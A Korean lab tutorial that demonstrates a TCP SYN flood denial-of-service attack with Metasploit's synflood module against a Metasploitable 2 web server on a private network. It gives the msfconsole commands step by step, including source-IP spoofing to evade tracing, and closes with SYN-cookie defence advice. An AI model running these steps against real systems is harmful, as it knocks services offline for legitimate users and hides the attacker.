메타스플로잇 서비스 거부 공격(DoS)
TCP SYN Flooding을 이용한 가용성 침해 실증

SCORE: 9.5 (CRITICAL)

System Architect Pro

1. 아키텍처 개요 (Architecture Overview)

DoS (Denial of Service, 서비스 거부 공격)는 타겟 시스템의 네트워크 대역폭이나 CPU, 메모리 자원을 고갈시켜 정상적인 사용자가 서비스를 이용할 수 없게 만드는 공격입니다. 본 실습에서는 TCP (Transmission Control Protocol, 전송 제어 프로토콜)의 연결 설정 과정인 3-Way Handshake (3방향 연결 설정)의 구조적 결함을 악용하는 SYN Flooding (신 플러딩) 기법을 메타스플로잇의 보조 모듈(Auxiliary)을 통해 검증합니다.

2. 실습 구성 요소 (Components)

NODE 01

공격자 (Attacker)

  • 운영체제: Kali Linux 2024.x
  • 프레임워크: Metasploit Framework (msfconsole)
  • 사용 모듈: auxiliary/dos/tcp/synflood
  • IP 주소: 192.168.50.10 (사설 망)
NODE 02

희생자 (Victim Target)

  • 운영체제: Metasploitable 2 (Ubuntu Linux)
  • 타겟 서비스: Apache Web Server (Port 80)
  • 상태: 방화벽(UFW) 및 안티-디도스 솔루션 미적용
  • IP 주소: 192.168.50.100 (사설 망)

3. 실증 및 구현 (Implementation)

S.01

DoS 모듈 검색 및 로드

메타스플로잇 콘솔을 실행하고, TCP 프로토콜의 약점을 이용하는 SYN 플러딩 공격 모듈을 검색하여 장착합니다.

Console
msf6 > search synflood
Matching Modules
================
# Name Disclosure Date Rank Check Description
- ---- --------------- ---- ----- -----------
0 auxiliary/dos/tcp/synflood normal No TCP SYN Flooder
msf6 > use 0
S.02

타겟 환경 및 위조 IP(Spoofing) 세팅

공격 대상의 웹 서버 포트(80)를 지정합니다. 중요: SHOST (Spoofed Host, 위조된 출발지 IP)를 임의의 주소(예: 1.1.1.1)로 조작하여 타겟이 엉뚱한 곳으로 응답을 보내게 만들어 추적을 피하고 자원을 더 빨리 고갈시킵니다.

Console
msf6 auxiliary(dos/tcp/synflood) > set RHOSTS 192.168.50.100
RHOSTS => 192.168.50.100
msf6 auxiliary(dos/tcp/synflood) > set RPORT 80
RPORT => 80
msf6 auxiliary(dos/tcp/synflood) > set SHOST 1.1.1.1
SHOST => 1.1.1.1
S.03

플러딩 공격 개시 (Exploitation)

설정이 완료되면 모듈을 실행합니다. 이 순간부터 칼리 리눅스는 초당 수만 개의 SYN 패킷을 타겟으로 쏟아부으며, 타겟 서버의 다른 터미널에서 top 명령어나 웹 브라우저 접속을 통해 시스템이 마비되는 것을 확인합니다.

Console
msf6 auxiliary(dos/tcp/synflood) > run
[*] SYN flooding 192.168.50.100:80...
... (대량의 트래픽이 발생하며, 프롬프트가 대기 상태로 유지됨) ...
^C // 공격 중단을 원할 경우 Ctrl+C 입력
[*] Auxiliary module execution completed

4. 아키텍트 인사이트 (Expert Insight)

SYN Cookie 기반 방어 아키텍처

시스템 관리자는 이러한 공격을 방어하기 위해 운영체제 커널 수준에서 SYN Cookies(신 쿠키) 기능을 활성화(net.ipv4.tcp_syncookies = 1)해야 합니다. 이를 통해 3-Way Handshake가 완전히 끝날 때까지 서버 메모리(Backlog Queue)를 할당하지 않아 자원 고갈을 원천적으로 차단할 수 있습니다.

클라우드 AUP 위반 및 과금 주의

AWS(아마존 웹 서비스) EC2 환경에서 타겟을 향해 DoS 테스트를 수행할 경우, 초당 발생하는 막대한 아웃바운드(Outbound) 네트워크 트래픽으로 인해 폭탄 요금(추가 과금)이 청구될 수 있습니다. 더불어 AWS AUP(허용되는 사용 정책) 위반 시스템에 즉각 탐지되어 회사 전체의 계정이 영구 정지(Suspension)되므로 반드시 로컬 격리망에서만 테스트하십시오.
